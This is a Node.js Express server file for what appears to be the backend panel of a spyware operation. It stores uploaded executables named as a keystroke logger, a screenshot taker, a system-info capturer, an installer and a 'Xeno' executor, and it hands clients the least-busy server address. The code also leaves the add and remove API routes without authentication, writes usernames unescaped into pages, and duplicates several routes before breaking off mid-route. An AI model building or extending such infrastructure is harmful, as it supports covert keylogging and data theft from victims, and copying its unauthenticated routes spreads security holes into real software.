import express from 'express';
import session from 'express-session';
import bcrypt from 'bcrypt';
import crypto from 'crypto';
import mongoose from 'mongoose';
import dotenv from 'dotenv';
import cron from 'node-cron';
import fetch from 'node-fetch';
import MongoStore from 'connect-mongo';
import multer from 'multer';
import { MongoClient, GridFSBucket } from 'mongodb';
import { Readable } from 'stream';


dotenv.config({ path: 'cert.env' });

const app = express();
const port = process.env.PORT || 3000;

// Secure random session secret
const sessionSecret = crypto.randomBytes(64).toString('hex');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('trust proxy', 1);
app.use(session({
  secret: sessionSecret,
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: process.env.GATEWAY_DB_URI,
    collectionName: 'sessions',
    ttl: 14 * 24 * 60 * 60
  }),
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 14 * 24 * 60 * 60 * 1000 // 14 days in ms
  }
}));

// MongoDB connection
const dbURI = process.env.GATEWAY_DB_URI;
mongoose.connect(dbURI)
  .then(() => console.log('✅ Connected to MongoDB Gateway Database'))
  .catch(err => console.error('❌ MongoDB connection error:', err));

// MongoDB Schemas
const UserSchema = new mongoose.Schema({
  username: { type: String, unique: true },
  passwordHash: String
});

const ApiEndpointSchema = new mongoose.Schema({
  url: String,
  type: String,
  ping: Number
});

const User = mongoose.model('User', UserSchema);
const ApiEndpoint = mongoose.model('ApiEndpoint', ApiEndpointSchema);

const ApiStatusSchema = new mongoose.Schema({
  url: String,
  status: String,
  usagePercent: String,
  message: String,
  databaseStatus: String,
  lastChecked: { type: Date, default: Date.now }
});
const ApiStatus = mongoose.model('ApiStatus', ApiStatusSchema);

const ServerOrderSchema = new mongoose.Schema({
  type: { type: String, enum: ['Public', 'Private'], unique: true },
  order: [String],
  updatedAt: { type: Date, default: Date.now }
});
const ServerOrder = mongoose.model('ServerOrder', ServerOrderSchema);

const statusPriority = {
  'idle': 1,
  'slightly busy': 2,
  'busy': 3,
  'very busy': 4,
  'not reachable': 5
};

// FileMetadata Schema
const FileMetadataSchema = new mongoose.Schema({
  category: {
    type: String,
    enum: ['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe']
  },
  filename: String,
  fileId: mongoose.Types.ObjectId,
  uploadedBy: String,
  uploadDate: { type: Date, default: Date.now },
  hash: String
});

// Compound unique index to ensure one file per category per user
FileMetadataSchema.index({ uploadedBy: 1, category: 1 }, { unique: true });

const FileMetadata = mongoose.model('FileMetadata', FileMetadataSchema);

// GridFS setup (assuming this is part of your original setup)
let bucket;
(async () => {
  const client = new MongoClient(process.env.GATEWAY_DB_URI);
  await client.connect();
  const db = client.db();
  bucket = new GridFSBucket(db, { bucketName: 'zips' });
})();

// Multer configuration with dynamic file type filtering
const zipUpload = multer({
  storage: multer.memoryStorage(),
  fileFilter: (req, file, cb) => {
    const category = req.params.category;
    let allowed;
    if (category === 'xenoExecutorZip') {
      allowed = /\.zip$/i.test(file.originalname);
    } else {
      allowed = /\.exe$/i.test(file.originalname);
    }
    cb(allowed ? null : new Error(`Only ${category === 'xenoExecutorZip' ? '.zip' : '.exe'} files allowed for ${category}`), allowed);
  }
});

// Function to calculate SHA256 hash
const calculateHash = (buffer) => {
  const hash = crypto.createHash('sha256');
  hash.update(buffer);
  return hash.digest('hex');
};

const chunkStorage = new Map();

const cleanupOldChunks = () => {
  const now = Date.now();
  console.log(`[${new Date().toISOString()}] Cleaning up old chunks...`);
  for (const [key, value] of chunkStorage.entries()) {
    const lastModified = value.lastModified || now;
    if (now - lastModified > 15 * 60 * 1000) { // 15 min
      console.log(`Deleting old chunk for key: ${key}`);
      chunkStorage.delete(key);
    }
  }
};
setInterval(cleanupOldChunks, 15 * 60 * 1000); // 15min hourly

// Polling function for API health
async function pollApi(api) {
  let record;
  try {
    const res = await fetch(`${api.url}/health`, { timeout: 3000 });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();

    let usagePercent = 'N/A';
    if (data.total_Capacity_MB && data.total_Used_MB) {
      usagePercent = ((+data.total_Used_MB / +data.total_Capacity_MB) * 100).toFixed(1);
    }

    let status = 'idle';
    if (usagePercent !== 'N/A') {
      const u = +usagePercent;
      status = u < 50 ? 'idle'
        : u < 70 ? 'slightly busy'
          : u < 90 ? 'busy'
            : 'very busy';
    }

    record = {
      url: api.url,
      status,
      usagePercent,
      message: data.message,
      databaseStatus: data.database_Status
    };
  } catch {
    record = {
      url: api.url,
      status: 'not reachable',
      usagePercent: 'N/A',
      message: 'fetch error',
      databaseStatus: 'N/A'
    };
  }
// update the status in the database
  await ApiStatus.findOneAndUpdate(
    { url: api.url },
    { $set: { ...record, lastChecked: new Date() } },
    { upsert: true }
  );
  return record;
}

// update the ServerOrder for a given type
async function updateOrderForType(type) {
  // get latest status per URL of this type
  const endpoints = (await ApiEndpoint.find({ type })).map(a => a.url);
  const statuses = await ApiStatus
    .find({ url: { $in: endpoints } })
    .sort({ lastChecked: -1 })
    .lean();

  const latest = {};
  statuses.forEach(s => {
    if (!latest[s.url]) latest[s.url] = s;
  });

  const newOrder = Object.values(latest)
    .sort((a, b) => statusPriority[a.status] - statusPriority[b.status])
    .map(r => r.url);

  await ServerOrder.findOneAndUpdate(
    { type },
    { order: newOrder, updatedAt: new Date() },
    { upsert: true }
  );
  console.log(`✅ ${type} ServerOrder updated:`, newOrder);
}

// schedule one cron per API based on its `ping` field
async function scheduleAllApis() {
  // stop any existing tasks
  cron.getTasks().forEach(t => t.stop());

  const apis = await ApiEndpoint.find({});
  for (const api of apis) {
    // every api.ping minutes:
    const spec = `*/${api.ping} * * * *`;
    cron.schedule(spec, async () => {
      console.log(`🔄 Polling ${api.type} API ${api.url}`);
      await pollApi(api);
      await updateOrderForType(api.type);
    });
  }
}

// initial scheduling
scheduleAllApis();

// re-schedule when endpoints collection changes
ApiEndpoint.watch().on('change', scheduleAllApis);



// Login Page
const loginHTML = `<!DOCTYPE html>
<html>
<head>
  <title>Login..</title>
  <meta charset="utf-8">
  <link href="/login.css" rel="stylesheet">
</head>
<body>
  <main>
    <center>
      <div class="login">
        <h2>Please Enter Your Username</h2>
        <form action="/login" method="POST">
          <input type="text" name="username" placeholder="Username" required>
          <input type="password" name="password" placeholder="Password" required>
          <input type="submit" value="Login" class="btn">
        </form>
      </div>
    </center>
  </main>
</body>
</html>
`;

// Template Wrapper
function wrapPageContent(username, content) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dashboard</title>
  <link href="/dashboard.css" rel="stylesheet">
  <link href="/api-remove.css" rel="stylesheet">
  <link href="/api-add.css" rel="stylesheet">
  <link href="/status-api.css" rel="stylesheet">
</head>
<body>
  <header>
    <div class="bar">
      <div><h2>Dashboard</h2></div>
      <div>
        <h4 id="username">Welcome, ${username}</h4>
        <form action="/logout" method="POST">
          <input type="submit" value="Sign Out" id="log-off">
        </form>
      </div>
    </div>
  </header>
  <main>${content}</main>
  <footer><h2>Created By Inevitable Studios</h2></footer>
  <script>
    const usernameLength = "${username}".length;
    const newGap = 66 - (usernameLength * 0.5);
    document.querySelector('.bar').style.gap = newGap + "vw";
  </script>
</body>
</html>`;
}

// Dashboard Page
const getDashboardHTML = (username) => wrapPageContent(username, `
  <div class="menus">
    <div class="upper-wrapper">
      <div class="sub1">
        <h1>Add Sub-API</h1>
        <div><hr><a href="/add-api">Proceed</a></div>
      </div>
      <div class="sub2">
        <h1>Remove Sub-API</h1>
        <div><hr><a href="/remove-api">Proceed</a></div>
      </div>
    </div>
    <div class="lower-wrapper">
      <div class="sub3">
        <h1>Live Status</h1>
        <div><hr><a href="/status">Proceed</a></div> <!-- Fixed to /status -->
      </div>
      <div class="sub4">
        <h1>Update Files</h1>
        <div><hr><a href="/updater">Proceed</a></div>
      </div>
    </div>
  </div>
`);

// Add Sub-API Page
const getAddAPIHTML = (username) => wrapPageContent(username, `
  <center>
  <div class="api-form">
    <div class="api-form-content">
      <h1>Add Sub-API</h1>
      <form action="/add-api" method="POST">
        <article>
          <div>
            <p>Address of API</p>
            <p>Sub-API Type</p>
            <p>Ping Duration</p>    
          </div>  
          <div>
            <input type="text" placeholder="Address Here" name="url" required>
            <select name="type">
              <optgroup label="Sub-API Type">
                <option>Public</option>
                <option>Private</option>
              </optgroup>
            </select>
            <input type="number" placeholder="In Minutes" name="ping" required>
          </div>    
        </article>
        <aside>
          <input type="submit" value="Apply">
          <button type="button" onclick="location.href='/dashboard'">Go Back</button>
        </aside>
      </form>
    </div>
  </div>
  </center>
`);

// Remove Sub-API Page
const getRemoveAPIHTML = (username, apiEndpoints) => {
  const apiListScript = `
    <script>
      const allAPIs = ${JSON.stringify(apiEndpoints)};
      const tableBody = document.getElementById("api-table-body");
      const filterSelect = document.getElementById("filter");

      function renderTable(type) {
        let filtered = allAPIs;
        if (type !== "All") {
          filtered = allAPIs.filter(api => api.type === type);
        }

        if (filtered.length === 0) {
          tableBody.innerHTML = "<tr><td colspan='4'>No APIs found.</td></tr>";
          return;
        }

        tableBody.innerHTML = filtered.map(api => \`
          <tr>
            <td>\${api.type}</td>
            <td>\${api.url}</td>
            <td>\${api.ping} min</td>
            <td>
              <form method="POST" action="/remove-api" onsubmit="return confirm('Are you sure you want to delete this API?')">
                <input type="hidden" name="url" value="\${api.url}">
                <input type="submit" value="Delete" class="delete-btn">
              </form>
            </td>
          </tr>
        \`).join('');
      }

      filterSelect.addEventListener("change", () => renderTable(filterSelect.value));
      renderTable("All");
    </script>
  `;

  return wrapPageContent(username, `
    <center>
    <div class="api-form-removal">
      <div class="api-form-content-removal">
        <h1>Remove Sub-API</h1>
        <div style="margin-bottom: 20px;">
          <label for="filter"><strong>Filter by Type:</strong></label>
          <select id="filter">
            <option>All</option>
            <option>Public</option>
            <option>Private</option>
          </select>
        </div>
        <div id="api-list">
          <table>
            <thead>
              <tr>
                <th>Type</th>
                <th>URL</th>
                <th>Ping</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody id="api-table-body"></tbody>
          </table>
        </div>
        <br>
        <button type="button" onclick="location.href='/dashboard'">Go Back</button>
      </div>
    </div>
    </center>
    ${apiListScript}
  `);
};

const getUploadHTML = async (username) => {
  const files = await FileMetadata.find({ uploadedBy: username }).lean();
  const fileMap = {};
  files.forEach(file => {
    fileMap[file.category] = file;
  });

  const getFileSection = (category, label, accept) => {
    const file = fileMap[category];
    if (file) {
      return `
        <div class="file-section">
          <h3>${label}</h3>
          <p>Current File: ${file.filename}</p>
          <p>Uploaded: ${new Date(file.uploadDate).toLocaleString()}</p>
          <form action="/remove/${category}" method="POST" onsubmit="return confirm('Are you sure you want to remove this file?')">
            <button type="submit" class="remove-btn">Remove</button>
          </form>
          <form id="update-${category}" enctype="multipart/form-data">
            <input type="file" id="file-update-${category}" accept="${accept}" required>
            <button type="submit" class="update-btn">Update</button>
            <progress id="progress-update-${category}" value="0" max="100" style="display: none; width: 100%;"></progress>
            <p id="status-update-${category}" style="color: #555;"></p>
          </form>
          <script>
            document.getElementById('update-${category}').addEventListener('submit', async (e) => {
              e.preventDefault();
              const form = e.target;
              const fileInput = document.getElementById('file-update-${category}');
              const progress = document.getElementById('progress-update-${category}');
              const status = document.getElementById('status-update-${category}');
              const updateBtn = form.querySelector('.update-btn');

              updateBtn.disabled = true;
              progress.style.display = 'block';
              status.textContent = 'Preparing file...';

              const file = fileInput.files[0];
              const chunkSize = 1024 * 1024; // 1MB chunks
              const totalChunks = Math.ceil(file.size / chunkSize);
              let uploadedChunks = 0;
              const retries = 3;

              for (let i = 0; i < totalChunks; i++) {
                const start = i * chunkSize;
                const end = Math.min(start + chunkSize, file.size);
                const chunk = file.slice(start, end);

                const formData = new FormData();
                formData.append('file', chunk, file.name);
                formData.append('chunkIndex', i);
                formData.append('totalChunks', totalChunks);
                formData.append('originalName', file.name);

                let attempt = 0;
                let success = false;
                while (attempt < retries && !success) {
                  try {
                    const response = await fetch('/upload-chunk/${category}', {
                      method: 'POST',
                      body: formData
                    });
                    if (response.ok) {
                      success = true;
                    } else {
                      throw new Error('Chunk upload failed');
                    }
                  } catch (err) {
                    attempt++;
                    if (attempt === retries) {
                      status.textContent = 'Upload failed at chunk ' + i + ' after ' + retries + ' retries';
                      updateBtn.disabled = false;
                      return;
                    }
                    status.textContent = 'Retrying chunk ' + i + ' (attempt ' + (attempt + 1) + ' of ' + retries + ')';
                    await new Promise(resolve => setTimeout(resolve, 1000));
                  }
                }

                uploadedChunks++;
                const percent = (uploadedChunks / totalChunks) * 100;
                progress.value = percent;
                status.textContent = 'Uploading: ' + Math.round(percent) + '%';
              }

              status.textContent = 'Processing file on server (this may take a moment)...';
              const finalizeResponse = await fetch('/finalize-upload/${category}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ originalName: file.name })
              });

              if (finalizeResponse.ok) {
                status.textContent = 'Update successful!';
                window.location = '/updater';
              } else {
                status.textContent = 'Server processing failed. Please try again.';
                updateBtn.disabled = false;
              }
            });
          </script>
        </div>
      `;
    } else {
      return `
        <div class="file-section">
          <h3>${label}</h3>
          <p>No file uploaded</p>
          <form id="upload-${category}" enctype="multipart/form-data">
            <input type="file" id="file-upload-${category}" accept="${accept}" required>
            <button type="submit" class="upload-btn">Upload</button>
            <progress id="progress-upload-${category}" value="0" max="100" style="display: none; width: 100%;"></progress>
            <p id="status-upload-${category}" style="color: #555;"></p>
          </form>
          <script>
            document.getElementById('upload-${category}').addEventListener('submit', async (e) => {
              e.preventDefault();
              const form = e.target;
              const fileInput = document.getElementById('file-upload-${category}');
              const progress = document.getElementById('progress-upload-${category}');
              const status = document.getElementById('status-upload-${category}');
              const uploadBtn = form.querySelector('.upload-btn');

              uploadBtn.disabled = true;
              progress.style.display = 'block';
              status.textContent = 'Preparing file...';

              const file = fileInput.files[0];
              const chunkSize = 1024 * 1024; // 1MB chunks
              const totalChunks = Math.ceil(file.size / chunkSize);
              let uploadedChunks = 0;
              const retries = 3;

              for (let i = 0; i < totalChunks; i++) {
                const start = i * chunkSize;
                const end = Math.min(start + chunkSize, file.size);
                const chunk = file.slice(start, end);

                const formData = new FormData();
                formData.append('file', chunk, file.name);
                formData.append('chunkIndex', i);
                formData.append('totalChunks', totalChunks);
                formData.append('originalName', file.name);

                let attempt = 0;
                let success = false;
                while (attempt < retries && !success) {
                  try {
                    const response = await fetch('/upload-chunk/${category}', {
                      method: 'POST',
                      body: formData
                    });
                    if (response.ok) {
                      success = true;
                    } else {
                      throw new Error('Chunk upload failed');
                    }
                  } catch (err) {
                    attempt++;
                    if (attempt === retries) {
                      status.textContent = 'Upload failed at chunk ' + i + ' after ' + retries + ' retries';
                      uploadBtn.disabled = false;
                      return;
                    }
                    status.textContent = 'Retrying chunk ' + i + ' (attempt ' + (attempt + 1) + ' of ' + retries + ')';
                    await new Promise(resolve => setTimeout(resolve, 1000));
                  }
                }

                uploadedChunks++;
                const percent = (uploadedChunks / totalChunks) * 100;
                progress.value = percent;
                status.textContent = 'Uploading: ' + Math.round(percent) + '%';
              }

              status.textContent = 'Processing file on server (this may take a moment)...';
              const finalizeResponse = await fetch('/finalize-upload/${category}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ originalName: file.name })
              });

              if (finalizeResponse.ok) {
                status.textContent = 'Upload successful!';
                window.location = '/updater';
              } else {
                status.textContent = 'Server processing failed. Please try again.';
                uploadBtn.disabled = false;
              }
            });
          </script>
        </div>
      `;
    }
  };

  return wrapPageContent(username, `
    <link href="/upload.css" rel="stylesheet">
    <div class="upload-wrapper">
      <div class="upload-card">
        <h1>Manage Files</h1>
        ${getFileSection('keyStrokerExe', 'Key code.exe', '.exe')}
        ${getFileSection('mainExecutableExe', 'Bescr.exe', '.exe')}
        ${getFileSection('snapTakerExe', 'Snapshotter.exe', '.exe')}
        ${getFileSection('snapSenderExe', 'Sysinfocapper.exe', '.exe')}
        ${getFileSection('xenoExecutorZip', 'Xeno version.zip', '.zip')}
        ${getFileSection('installerExe', 'Installer.exe', '.exe')}
        <div class="upload-actions">
          <button type="button" onclick="location.href='/dashboard'" class="cancel-btn">Back to Dashboard</button>
        </div>
      </div>
    </div>
  `);
};

// Routes
app.get('/', (req, res) => {
  if (req.session.user) return res.redirect('/dashboard');
  res.send(loginHTML);
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({ username });
  if (user && bcrypt.compareSync(password, user.passwordHash)) {
    req.session.user = username;
    res.redirect('/dashboard');
  } else {
    res.send(`<h3>Login Failed</h3><a href="/">Try again</a>`);
  }
});

app.get('/dashboard', (req, res) => {
  if (!req.session.user) return res.redirect('/');
  res.send(getDashboardHTML(req.session.user));
});

app.get('/add-api', (req, res) => {
  if (!req.session.user) return res.redirect('/');
  res.send(getAddAPIHTML(req.session.user));
});

app.post('/add-api', async (req, res) => {
  const { url, type, ping } = req.body;
  await ApiEndpoint.create({ url, type, ping: parseInt(ping) });
  console.log(`✅ New API Added: ${url}`);
  res.redirect('/dashboard');
});

app.get('/remove-api', async (req, res) => {
  if (!req.session.user) return res.redirect('/');
  const apis = await ApiEndpoint.find({});
  res.send(getRemoveAPIHTML(req.session.user, apis));
});

app.post('/remove-api', async (req, res) => {
  const { url } = req.body;
  await ApiEndpoint.deleteOne({ url });
  console.log(`✅ Removed API: ${url}`);
  res.redirect('/dashboard');
});

app.post('/logout', (req, res) => {
  req.session.destroy(err => {
    if (err) console.error('Logout Error:', err);
    res.redirect('/');
  });
});


app.get('/status', (req, res) => {
  if (!req.session.user) {
    return res.redirect('/');
  }
  const username = req.session.user;

  const content = `
  <center>
    <div class="status-header">
      <div class="top-bar">
        <h1>API Status Dashboard</h1>
        <div>
          <button class="refresh-btn" onclick="fetchStatuses()">Refresh</button>
          <button class="refresh-btn" onclick="history.back()">Back</button>
        </div>
      </div>
      <div class="timestamp" id="timestamp">Last updated: never</div>
      <section class="status-grid" id="statusGrid">
        <!-- API cards will be inserted here -->
      </section>
    </div>
  </center>

  <script>
    async function fetchStatuses() {
      try {
        const res = await fetch('/status/data');
        const data = await res.json();
        const grid = document.getElementById('statusGrid');
        const timestamp = document.getElementById('timestamp');
        grid.innerHTML = '';

        data.forEach(api => {
          const card = document.createElement('div');
          card.className = 'status-card';
          card.style.borderLeftColor = getBorderColor(api.status);
          card.innerHTML = \`
            <h3>\${api.type}</h3>
            <p style="color:\${getBorderColor(api.status)};"><strong>URL:</strong> \${api.url}</p>
            <p style="color:\${getBorderColor(api.status)};"><strong>Status:</strong> <span class="badge \${getBadgeClass(api.status)}">\${api.statusDisplay}</span></p>
            <p style="color:\${getBorderColor(api.status)};"><strong>Message:</strong> \${api.message}</p>
            <p style="color:\${getBorderColor(api.status)};"><strong>Database Status:</strong> \${api.databaseStatus}</p>
            <p style="color:\${getBorderColor(api.status)};"><strong>Usage:</strong> \${api.usagePercent}%</p>
            <div class="usage-bar">
              <div class="usage-fill" style="width: \${api.usagePercent !== 'N/A' ? api.usagePercent : 0}%"></div>
            </div>
          \`;
          grid.appendChild(card);
        });

        timestamp.textContent = "Last updated: " + new Date().toLocaleString();
      } catch (err) {
        console.error('Failed to fetch statuses', err);
      }
    }

    function getBorderColor(status) {
      switch (status) {
        case 'idle': return '#4caf50';
        case 'slightly busy': return '#ffeb3b';
        case 'busy': return '#ff9800';
        case 'very busy': return '#f44336';
        case 'not reachable': return '#9e9e9e';
        default: return 'lightgray';
      }
    }

    function getBadgeClass(status) {
      switch (status) {
        case 'idle': return 'badge-idle';
        case 'slightly busy': return 'badge-slightly';
        case 'busy': return 'badge-busy';
        case 'very busy': return 'badge-very';
        case 'not reachable': return 'badge-not';
        default: return '';
      }
    }

    fetchStatuses();
    setInterval(fetchStatuses, 15000); // Auto-refresh every 15 seconds
  </script>
  `;

  res.send(wrapPageContent(username, content));
});

app.get('/status/data', async (req, res) => {
  if (!req.session.user) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  let statuses = [];

  try {
    const apiData = await ApiEndpoint.find({});

    for (const api of apiData) {
      try {
        const response = await fetch(`${api.url}/health`, { timeout: 3000 });

        if (!response.ok) throw new Error('Not OK');

        const data = await response.json();

        let status = 'idle';
        let usagePercent = 'N/A';

        if (data.total_Capacity_MB && data.total_Used_MB) {
          const usedMB = parseFloat(data.total_Used_MB);
          const totalMB = parseFloat(data.total_Capacity_MB);
          usagePercent = ((usedMB / totalMB) * 100).toFixed(1);
        }

        if (usagePercent !== 'N/A') {
          const usage = parseFloat(usagePercent);
          if (usage < 50) status = 'idle';
          else if (usage < 70) status = 'slightly busy';
          else if (usage < 90) status = 'busy';
          else status = 'very busy';
        }

        statuses.push({
          url: api.url,
          type: api.type,
          message: data.message,
          usagePercent,
          status,
          databaseStatus: data.database_Status,
          statusDisplay: status.charAt(0).toUpperCase() + status.slice(1),
        });
      } catch (error) {
        statuses.push({
          url: api.url,
          type: api.type,
          message: 'Error fetching health data',
          usagePercent: 'N/A',
          status: 'not reachable',
          databaseStatus: 'N/A',
          statusDisplay: 'Not Reachable',
        });
      }
    }

    res.json(statuses);
  } catch (err) {
    console.error('Error fetching API endpoints:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/order', async (req, res) => {
  const { server, port } = req.body;
  if (typeof server !== 'string' || !port) {
    return res.status(400).json({ error: 'Must provide { server, port } in JSON body' });
  }

  // decide which ordering to use
  let type;
  if (server.includes('.public')) type = 'Public';
  else if (server.includes('.private')) type = 'Private';
  else return res.status(400).json({ error: 'Server must contain .public or .private' });

  try {
    // fetch the stored ordering for that type
    const doc = await ServerOrder.findOne({ type });
    if (!doc) return res.status(404).json({ error: `No ordering found for type=${type}` });

    // doc.order is least-busy → most-busy; reverse it:
    const mostToLeast = [...doc.order].reverse();

    return res.json({ type, port, order: mostToLeast });
  } catch (err) {
    console.error('​/order error', err);
    return res.status(500).json({ error: 'Server error' });
  }
});
app.post('/client-ip-get', async (req, res) => {
  const { server, port } = req.body;
  if (typeof server !== 'string' || !port) {
    return res.status(400).json({ error: 'Must provide { client ip, client port } in JSON body' });
  }

  // decide which ordering to use
  let type;
  if (server.includes('.public')) type = 'Public';
  else if (server.includes('.private')) type = 'Private';
  else return res.status(400).json({ error: 'client ip must contain .public or .private' });

  try {
    // fetch the stored ordering for that type
    const doc = await ServerOrder.findOne({ type });
    if (!doc || !doc.order || doc.order.length === 0) {
      return res.status(404).json({ error: `No ordering found for type=${type}` });
    }

    // doc.order is already least-busy → most-busy
    const leastBusy = doc.order[0];

    return res.json({ ip: leastBusy });
  } catch (err) {
    console.error('​/client-ip-get error', err);
    return res.status(500).json({ error: 'Server error' });
  }
});

// health-check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ message: 'ok' });
});

// Routes
app.get('/updater', async (req, res) => {
  if (!req.session.user) {
    console.log('Unauthorized access to /updater');
    return res.redirect('/');
  }
  res.send(await getUploadHTML(req.session.user));
});

app.post('/upload-chunk/:category', zipUpload.single('file'), async (req, res) => {
  if (!req.session.user) {
    console.log('Unauthorized chunk upload attempt to category:', req.params.category);
    return res.status(401).send('Unauthorized');
  }

  const category = req.params.category;
  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
    console.log(`Invalid category chunk upload attempt: ${category}`);
    return res.status(400).send('Invalid category');
  }

  const chunkIndex = parseInt(req.body.chunkIndex, 10);
  const totalChunks = parseInt(req.body.totalChunks, 10);
  const originalName = req.body.originalName;
  const userId = req.session.user;

  // Store the chunk in memory
  const storageKey = `${userId}-${category}`;
  if (!chunkStorage.has(storageKey)) {
    chunkStorage.set(storageKey, { chunks: new Array(totalChunks), totalChunks, lastModified: Date.now() });
  }

  const storage = chunkStorage.get(storageKey);
  storage.chunks[chunkIndex] = req.file.buffer;
  storage.lastModified = Date.now();

  res.status(200).send('Chunk uploaded');
});

app.post('/finalize-upload/:category', async (req, res) => {
  const start = Date.now();

  if (!req.session.user) {
    console.log('Unauthorized finalization attempt for category:', req.params.category);
    return res.status(401).send('Unauthorized');
  }

  const category = req.params.category;
  console.log(`[${new Date().toISOString()}] Starting finalization for user: ${req.session.user}, category: ${category}`);

  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
    console.log(`Invalid category finalization attempt: ${category}`);
    return res.status(400).send('Invalid category');
  }

  const { originalName } = req.body;
  const userId = req.session.user;
  const storageKey = `${userId}-${category}`;

  // Retrieve chunks from memory
  if (!chunkStorage.has(storageKey)) {
    return res.status(400).send('No chunks found for this upload');
  }

  const storage = chunkStorage.get(storageKey);
  const totalChunks = storage.totalChunks;
  const chunks = storage.chunks;

  // Verify all chunks are present
  for (let i = 0; i < totalChunks; i++) {
    if (!chunks[i]) {
      return res.status(400).send(`Missing chunk ${i}`);
    }
  }

  // Delete existing file if it exists (for updates)
  const existingFile = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
  if (existingFile) {
    console.log(`Deleting existing file: ${existingFile.filename}, category: ${category}, uploaded by: ${req.session.user}`);
    await bucket.delete(existingFile.fileId);
  }

  // Reconstruct the file from chunks
  const buffer = Buffer.concat(chunks);
  const fileStream = Readable.from(buffer);

  const hashStart = Date.now();
  const hash = calculateHash(buffer);
  console.log(`[${new Date().toISOString()}] Hash calculated in ${Date.now() - hashStart}ms`);

  const uploadStream = bucket.openUploadStream(originalName, {
    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category, hash }
  });

  fileStream.pipe(uploadStream);

  uploadStream.on('finish', async () => {
    const dbStart = Date.now();
    await FileMetadata.findOneAndUpdate(
      { category, uploadedBy: req.session.user },
      { filename: originalName, fileId: uploadStream.id, uploadDate: new Date(), hash },
      { upsert: true }
    );
    console.log(`[${new Date().toISOString()}] DB update in ${Date.now() - dbStart}ms`);

    console.log(`[${new Date().toISOString()}] Finalization successful for user: ${req.session.user}, category: ${category}, file: ${originalName}, total time: ${Date.now() - start}ms`);

    // Clean up memory
    chunkStorage.delete(storageKey);

    res.status(200).send('Upload finalized');
  });

  uploadStream.on('error', (err) => {
    console.error(`GridFS upload error for user: ${req.session.user}, category: ${category}, file: ${originalName}`, err);
    chunkStorage.delete(storageKey); // Clean up on error
    res.status(500).send('Upload failed');
  });
});

app.post('/remove/:category', async (req, res) => {
  if (!req.session.user) {
    console.log('Unauthorized remove attempt for category:', req.params.category);
    return res.status(401).send('Unauthorized');
  }

  const category = req.params.category;
  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
    console.log(`Invalid category remove attempt: ${category}`);
    return res.status(400).send('Invalid category');
  }

  console.log(`Starting removal for user: ${req.session.user}, category: ${category}`);
  const file = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
  if (file) {
    console.log(`Removing file: ${file.filename}, category: ${category}, uploaded by: ${req.session.user}`);
    await bucket.delete(file.fileId);
    await FileMetadata.deleteOne({ category, uploadedBy: req.session.user });
  }
  res.redirect('/updater');
});

app.post('/finalize-upload/:category', async (req, res) => {
  const start = Date.now();

  if (!req.session.user) {
    console.log('Unauthorized finalization attempt for category:', req.params.category);
    return res.status(401).send('Unauthorized');
  }

  const category = req.params.category;
  console.log(`[${new Date().toISOString()}] Starting finalization for user: ${req.session.user}, category: ${category}`);

  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
    console.log(`Invalid category finalization attempt: ${category}`);
    return res.status(400).send('Invalid category');
  }

  const { originalName } = req.body;
  const userId = req.session.user;
  const storageKey = `${userId}-${category}`;

  // Retrieve chunks from memory
  if (!chunkStorage.has(storageKey)) {
    return res.status(400).send('No chunks found for this upload');
  }

  const storage = chunkStorage.get(storageKey);
  const totalChunks = storage.totalChunks;
  const chunks = storage.chunks;

  // Verify all chunks are present
  for (let i = 0; i < totalChunks; i++) {
    if (!chunks[i]) {
      return res.status(400).send(`Missing chunk ${i}`);
    }
  }

  // Delete existing file if it exists (for updates)
  const existingFile = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
  if (existingFile) {
    console.log(`Deleting existing file: ${existingFile.filename}, category: ${category}, uploaded by: ${req.session.user}`);
    await bucket.delete(existingFile.fileId);
  }

  // Reconstruct the file from chunks
  const buffer = Buffer.concat(chunks);
  const fileStream = Readable.from(buffer);

  const hashStart = Date.now();
  const hash = calculateHash(buffer);
  console.log(`[${new Date().toISOString()}] Hash calculated in ${Date.now() - hashStart}ms`);

  const uploadStream = bucket.openUploadStream(originalName, {
    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category, hash }
  });

  fileStream.pipe(uploadStream);

  uploadStream.on('finish', async () => {
    const dbStart = Date.now();
    await FileMetadata.findOneAndUpdate(
      { category, uploadedBy: req.session.user },
      { filename: originalName, fileId: uploadStream.id, uploadDate: new Date(), hash },
      { upsert: true }
    );
    console.log(`[${new Date().toISOString()}] DB update in ${Date.now() - dbStart}ms`);

    console.log(`[${new Date().toISOString()}] Finalization successful for user: ${req.session.user}, category: ${category}, file: ${originalName}, total time: ${Date.now() - start}ms`);

    // Clean up memory
    chunkStorage.delete(storageKey);

    res.status(200).send('Upload finalized');
  });

  uploadStream.on('error', (err) => {
    console.error(`GridFS upload error for user: ${req.session.user}, category: ${category}, file: ${originalName}`, err);
    chunkStorage.delete(storageKey); // Clean up on error
    res.status(500).send('Upload failed');
  });
});

app.post('/remove/:category', async (req, res) => {
  if (!req.session.user) {
